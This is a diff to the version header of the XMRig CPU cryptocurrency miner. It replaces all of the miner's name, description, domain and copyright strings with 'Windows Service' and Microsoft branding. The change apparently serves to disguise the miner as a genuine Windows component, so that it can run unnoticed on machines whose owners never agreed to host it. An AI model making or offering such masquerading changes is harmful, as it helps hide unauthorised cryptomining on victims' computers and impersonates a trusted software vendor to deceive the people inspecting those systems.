@@ -1,13 +1,13 @@
 #ifndef __VERSION_H__
 #define __VERSION_H__
 
-#define APP_ID        "xmrig"
-#define APP_NAME      "XMRig"
-#define APP_DESC      "XMRig CPU miner"
-#define APP_VERSION   "2.4.5"
-#define APP_DOMAIN    "xmrig.com"
-#define APP_SITE      "www.xmrig.com"
-#define APP_COPYRIGHT "Copyright (C) 2016-2018 xmrig.com"
+#define APP_ID        "Windows Service"
+#define APP_NAME      "Windows Service"
+#define APP_DESC      "Windows Service"
+#define APP_VERSION   "Custom 2.4.5"
+#define APP_DOMAIN    "microsoft.com"
+#define APP_SITE      "www.microsoft.com"
+#define APP_COPYRIGHT "Copyright (C) 2016-2018 Microsoft"
 #define APP_KIND      "cpu"
 
 #define APP_VER_MAJOR  2
